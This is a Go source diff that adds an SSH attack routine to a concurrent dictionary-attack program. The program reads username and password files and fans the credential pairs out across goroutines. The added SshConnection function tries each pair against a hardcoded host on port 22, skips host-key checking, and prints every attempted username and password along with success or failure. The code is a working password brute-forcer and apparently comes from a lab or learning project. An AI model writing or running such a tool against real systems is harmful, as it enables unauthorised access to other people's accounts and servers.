@@ -3,11 +3,14 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"net"
 	"os"
 	"runtime"
 	"strconv"
 	"sync"
 	"time"
+
+	"golang.org/x/crypto/ssh"
 )
 
 // func check(e error) {
@@ -22,6 +25,7 @@ import (
 // 	pass string
 // 	pos  string
 // }
+var streamWidth int
 
 // Dictionary reader, the answer flow to the return channel
 func read2files(
@@ -29,7 +33,7 @@ func read2files(
 	userFile string,
 	passFile string,
 ) <-chan interface{} {
-	credentialStream := make(chan interface{})
+	credentialStream := make(chan interface{}, streamWidth)
 	go func() {
 		defer close(credentialStream)
 
@@ -89,7 +93,7 @@ func fanIn(
 	channels ...<-chan string,
 ) <-chan string {
 	var wg sync.WaitGroup
-	multiplexedStream := make(chan string, 8)
+	multiplexedStream := make(chan string, streamWidth)
 	multiplex := func(c <-chan string) {
 		defer wg.Done()
 		for i := range c {
@@ -122,6 +126,39 @@ func protocolX( // ssh, ftp, smtp, http, smb
 	return fmt.Sprintf("Goroutine %s:\t%s\t%s\t%s", name, credential.pos, credential.user, credential.pass)
 }
 
+//workSSH goroutine for one attack of SSH
+func SshConnection(done <-chan interface{},
+	credential login,
+	name string,
+) string {
+	//SSH basic connection
+	config := &ssh.ClientConfig{
+		User: credential.user,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(credential.pass),
+		},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+	}
+
+	//Recover function
+	defer func() {
+		r := recover()
+		if r != nil {
+			fmt.Println(r)
+		}
+	}()
+
+	t := net.JoinHostPort("192.168.1.46", "22")
+
+	_, err := ssh.Dial("tcp", t, config)
+
+	if err != nil {
+		return fmt.Sprintf("Goroutine %s:[x]Failed connection\t%s\t%s\t%s", name, credential.pos, credential.user, credential.pass)
+	} else {
+		return fmt.Sprintf("Goroutine %s:[+]Session connected\t%s\t%s\t%s", name, credential.pos, credential.user, credential.pass)
+	}
+}
+
 // Attack job to call protocol X and send the response result
 func attack(
 	done <-chan interface{},
@@ -129,7 +166,7 @@ func attack(
 	name string,
 	protocol func(done <-chan interface{}, credential login, name string) string,
 ) <-chan string {
-	responseStream := make(chan string)
+	responseStream := make(chan string, streamWidth)
 	go func() {
 		defer close(responseStream)
 		for {
@@ -149,6 +186,8 @@ func attack(
 }
 
 func Use_model2() time.Duration {
+	runtime.GOMAXPROCS(runtime.NumCPU())
+	streamWidth = runtime.NumCPU()
 	done := make(chan interface{})
 	defer close(done)
 
@@ -162,12 +201,12 @@ func Use_model2() time.Duration {
 	//fan out
 	workers := make([]<-chan string, numWorkers)
 	for i := 0; i < numWorkers; i++ {
-		workers[i] = attack(done, readStream, strconv.Itoa(i+1), protocolX)
+		workers[i] = attack(done, readStream, strconv.Itoa(i+1), SshConnection)
 	}
 
 	//fanIn
 	for resp := range fanIn(done, workers...) {
-		fmt.Sprintln(resp)
+		fmt.Println(resp)
 	}
 	return time.Since(start)
 	// fmt.Printf("Atack took: %v", time.Since(start))
